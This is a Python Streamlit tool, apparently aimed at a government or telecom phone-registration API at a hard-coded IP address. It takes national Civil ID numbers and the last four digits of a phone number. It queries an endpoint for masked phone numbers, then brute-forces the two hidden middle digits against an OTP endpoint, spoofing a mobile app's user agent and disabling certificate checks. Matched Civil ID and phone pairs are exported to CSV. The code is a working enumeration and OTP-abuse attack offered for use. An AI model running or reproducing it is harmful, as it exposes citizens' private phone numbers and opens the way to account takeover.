import csv
import json
import re
import time
import pandas as pd
import requests
import streamlit as st
import urllib3

# Disable insecure HTTPS warnings for IP-based endpoints
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Page configuration
st.set_page_config(
    page_title="📱 ROP Auto Range Match Tool", page_icon="📱", layout="wide"
)

# Initialize Session States
if "otp_results" not in st.session_state:
    st.session_state.otp_results = []
if "logs" not in st.session_state:
    st.session_state.logs = []
if "is_running" not in st.session_state:
    st.session_state.is_running = False
if "stop_requested" not in st.session_state:
    st.session_state.stop_requested = False

st.title("📱 ROP Auto Range Match Tool (00 to 99 Check)")

# Sidebar Configuration for Host
st.sidebar.header("⚙️ Configuration")
default_host = "5.37.58.147"
host = st.sidebar.text_input("API Target Host / IP", value=default_host)

# Main Section: Batch Data Input
st.subheader("📋 Batch Search Input")
batch_input_mode = st.radio("Input Mode", ["Manual Text Entry", "Upload CSV / TXT File"])

batch_text_data = ""
if batch_input_mode == "Manual Text Entry":
    batch_text_data = st.text_area(
        "Enter Civil ID and Last 4 Digits (Format: CivilID, Last4Digits per line)",
        value="5701982, 1944",
        height=150,
    )
else:
    uploaded_file = st.file_uploader(
        "Upload Batch File (.csv or .txt)", type=["csv", "txt"]
    )
    if uploaded_file is not None:
        batch_text_data = uploaded_file.read().decode("utf-8")
        st.text_area("Loaded File Preview", value=batch_text_data, height=150)


def get_headers(target_host):
    return {
        "host": target_host,
        "content-type": "application/json",
        "accept-encoding": "gzip",
        "user-agent": "Dart/3.9 (dart:io)",
    }


def fetch_fresh_token_for_civil_id(session, target_host, civil_id):
    try:
        url = f"https://{target_host}/nrsPhone"
        payload = {"civilId": civil_id}
        headers = get_headers(target_host)

        resp = session.post(url, json=payload, headers=headers, timeout=15)
        resp_text = resp.text.strip()
        st.session_state.logs.append(f"📥 Civil ID Response for {civil_id}: {resp_text}")

        data = json.loads(resp_text)
        if "mobile" in data and data["mobile"]:
            return True, data
        return False, data
    except Exception as e:
        st.session_state.logs.append(
            f"❌ Error fetching mobile data for {civil_id}: {str(e)}"
        )
        return False, {}


def test_single_phone(
    session, target_host, civil_id, phone, token_val, civil_id_token
):
    if st.session_state.stop_requested:
        return False
    try:
        url = f"https://{target_host}/otp"
        payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
        headers = get_headers(target_host)

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        resp_text = resp.text.strip()

        if resp_text and "token" in resp_text and "id" in resp_text:
            st.session_state.otp_results.append(
                {"civil_id": civil_id, "phone": phone}
            )
            st.session_state.logs.append(
                f"🎯 MATCH FOUND: Civil ID -> {civil_id} | Phone -> {phone}"
            )
            return True
    except Exception:
        pass
    return False


# Control Buttons
col1, col2, col3, col4 = st.columns(4)

with col1:
    start_btn = st.button("🚀 START AUTO RANGE MATCH", type="primary")
with col2:
    stop_btn = st.button("⏹️ STOP", type="secondary")
with col3:
    clear_btn = st.button("🗑️ CLEAR ALL")
with col4:
    status_container = st.empty()

if stop_btn:
    st.session_state.stop_requested = True
    st.session_state.is_running = False
    status_container.warning("Process Stopped.")

if clear_btn:
    st.session_state.otp_results = []
    st.session_state.logs = []
    st.session_state.is_running = False
    st.session_state.stop_requested = False
    st.rerun()

if start_btn:
    if not batch_text_data.strip():
        st.error("Pehle batch data enter karein ya file load karein!")
    else:
        st.session_state.is_running = True
        st.session_state.stop_requested = False
        st.session_state.otp_results = []

        lines = batch_text_data.split("\n")
        tasks_list = []
        seen_ids = set()

        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = re.split(r"[,;\s]+", line)
            if len(parts) >= 2:
                cid = parts[0].strip()
                last4 = parts[1].strip()
                if (
                    cid.isdigit()
                    and last4.isdigit()
                    and len(last4) == 4
                    and cid not in seen_ids
                ):
                    seen_ids.add(cid)
                    tasks_list.append((cid, last4))

        if not tasks_list:
            st.error("Koi valid format nahi mila! Sahi format: CivilID, Last4Digits")
            st.session_state.is_running = False
        else:
            status_container.info(f"🔄 Running Auto Range Match for {len(tasks_list)} items...")
            session = requests.Session()
            session.verify = False

            for idx, (civil_id, suffix) in enumerate(tasks_list):
                if st.session_state.stop_requested:
                    break

                st.session_state.logs.append(
                    f"\n--- Processing [{idx+1}/{len(tasks_list)}] Civil ID: {civil_id} (Last 4: {suffix}) ---"
                )
                
                time.sleep(0.5)
                success, data = fetch_fresh_token_for_civil_id(
                    session, host, civil_id
                )

                if not success or not data or not data.get("mobile"):
                    continue

                mobile_dict = data.get("mobile", {})
                civil_id_token = data.get("civilId", "")
                matched_in_this_id = False

                for masked_num, token_val in mobile_dict.items():
                    if st.session_state.stop_requested or matched_in_this_id:
                        break
                    
                    clean_digits = re.sub(r"\D", "", masked_num)
                    if len(clean_digits) < 2:
                        continue
                    
                    # Extract first 2 digits from the masked response number
                    prefix = clean_digits[:2]
                    st.session_state.logs.append(f"⚡ Testing Mask: {masked_num} -> Prefix: {prefix} with range 00-99")

                    # Automatically generate numbers from prefix + 00 to 99 + suffix
                    for i in range(100):
                        if st.session_state.stop_requested or matched_in_this_id:
                            break
                        
                        middle_digits = f"{i:02d}"
                        phone = f"{prefix}{middle_digits}{suffix}"

                        # Test each generated phone number sequentially with a small delay
                        time.sleep(0.2)
                        if test_single_phone(session, host, civil_id, phone, token_val, civil_id_token):
                            matched_in_this_id = True
                            break

            status_container.success("✅ Auto Range Match Completed!")
            st.session_state.is_running = False
            st.rerun()

# Display Results Section (Only Matched Results)
st.markdown("---")
st.subheader("🎯 Matched Results")
if st.session_state.otp_results:
    df_matched = pd.DataFrame(st.session_state.otp_results)
    st.dataframe(df_matched, use_container_width=True)

    csv_data = df_matched.to_csv(index=False).encode("utf-8")
    st.download_button(
        "📥 Export Matched CSV",
        data=csv_data,
        file_name="matched_results.csv",
        mime="text/csv",
    )
else:
    st.info("No matches found yet.")

# Live Logs Section
st.markdown("---")
st.subheader("📜 Live Console Logs")
log_text = "\n".join(st.session_state.logs[-100:])
st.text_area("Console", value=log_text, height=200, label_visibility="collapsed")
